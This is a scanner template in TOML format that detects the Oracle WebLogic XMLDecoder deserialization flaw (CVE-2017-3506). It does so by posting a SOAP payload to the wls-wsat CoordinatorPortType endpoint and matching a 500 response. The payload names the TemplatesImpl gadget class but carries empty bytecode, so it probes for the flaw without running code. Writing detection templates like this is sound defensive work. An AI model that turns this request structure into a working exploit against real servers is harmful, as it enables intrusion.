[info]
author = "ave"
description = "Detects Oracle WebLogic Server XMLDecoder deserialization vulnerability via wls-wsat endpoint"
id = "POC-AVE-2017-0668"
name = "PoC for AVE-2017-0668"
severity = "medium"
tags = [
    "cve-2017-3506",
    "weblogic",
    "deserialization",
]
vuln_id = [
    "AVE-2017-0668",
    "CVE-2017-3506",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/wls-wsat/CoordinatorPortType"
protocol = "http"

[poc.requests.body]
content = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><void class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"><void property="transletBytecodes"><array class="byte[]" length="1"><void index="0"><string></string></void></array></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
type = "raw"

[poc.requests.headers]
Content-Type = "text/xml"

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"
